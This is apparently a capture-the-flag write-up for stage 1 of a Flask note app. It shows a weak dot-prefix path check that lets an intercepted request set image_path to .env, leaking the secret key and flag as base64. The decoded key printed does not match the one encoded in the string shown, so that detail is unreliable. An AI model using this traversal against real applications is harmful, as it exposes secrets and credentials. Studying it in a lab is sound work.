## Initial Reconnaissance
in server/setup.py we see
```python
with open(".env", "w") as f:
    f.write(f"FLASK_APP_SECRET_KEY={os.urandom(50).hex()}\n")
    f.write(f"FLAG_STAGE_1={FLAG_STAGE_1}\n")
```
which means that  FLASK_APP_SECRET_KEY and FLAG_STAGE_1 are stored in server/.env


## Insufficient path traversal check
in server/main.py we can see weak image path security
```python
def read_file(path):
    # Prevent reading files outside the allowed directory (.img/).
    if not re.search(r'^\.\w+.*$', str(os.path.relpath(path))):
        return ""
    try:
        with open(path, 'rb') as f:
            content = f.read()
            base64_content = base64.b64encode(content).decode('utf-8')
            return base64_content
    except Exception:
        return ""
```

## Getting flag 1
we can obtain flag 1 by intercepting (using burpsuite for example) new note creation request and changing image_path from __img%2F1.png__ to __.env__ 

after redirect to view_note page, instead of an image we get sth like:
```
data:image/png;base64, RkxBU0tfQVBQX1NFQ1JFVF9LRVk9NGJlZmRhMjNmOTZkNTc1MGNkMWZiNWIxNmVlNWQzNThhOTNiZTI5MzIzNGQ4NWJlMGE0OGVjNWVmNTUxZTNjMmEzZmY0MjRkZGViMDk2YTRmZGE4NGMwZWUwZjU1YjY0OTI1NApGTEFHX1NUQUdFXzE9R1BOQ1RGe2ZsYWdfc3RhZ2VfMV90aGVfcmVhbF9mbGFnX3dpbGxfYmVfb25fdGhlX3Byb3ZpZGVkX2luc3RhbmNlfQo=
```

and after decoding base64 we get flag and flask secret key, which is needed for next flags

```
FLASK_APP_SECRET_KEY=f28e51357c35ab5d7448501a37780c03b886a92064a2a27e6785949bcf606a11b912915834cb7811052dcb39448130258b76
FLAG_STAGE_1=GPNCTF{flag_stage_1_the_real_flag_will_be_on_the_provided_instance}
```


